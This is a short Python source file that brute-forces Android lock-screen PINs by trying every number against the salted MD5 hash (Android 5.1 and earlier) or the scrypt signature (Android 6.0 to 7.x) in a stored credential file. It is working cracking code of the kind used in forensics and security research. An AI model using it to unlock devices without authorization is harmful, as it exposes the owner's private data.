import hashlib
from io import BufferedReader
import struct

from exception import InvalidFileException


def old_pin_crack(gesture_file: BufferedReader, length: int, salt: int):
    # Android versions <= 5.1
    gesture_file_contents = gesture_file.read()
    if len(gesture_file_contents) != 72:
        raise InvalidFileException("Gesture pattern file needs to be exactly 72 bytes")
    combined_hash = gesture_file_contents.decode().casefold()
    sha1, md5 = combined_hash[:40], combined_hash[40:]
    # Get salt
    salt1 = hex(salt & 0xFFFFFFFF)
    salt2 = hex(salt >> 32 & 0xFFFFFFFF)
    parsed_salt = salt2[2:] + salt1[2:]

    for possible_num in range(10 ** length):
        num = str(possible_num).zfill(length)
        salted = num + parsed_salt
        hashed = hashlib.md5(salted.encode()).hexdigest()
        if hashed == md5:
            return num


def new_pin_crack(gesture_file: BufferedReader, length: int):
    # Android versions < 8.0, >= 6.0
    N = 16384
    r = 8
    p = 1
    gesture_file_contents = gesture_file.read()
    if len(gesture_file_contents) != 58:
        raise InvalidFileException("Gesture pattern file needs to be exactly 58 bytes")
    s = struct.Struct("<17s 8s 32s")
    meta, salt, signature = s.unpack_from(gesture_file_contents)
    for possible_num in range(10 ** length):
        num = str(possible_num).zfill(length)
        to_hash = meta + num.encode()
        hashed = hashlib.scrypt(to_hash, salt=salt, n=N, r=r, p=p)
        if hashed[:32] == signature:
            return num
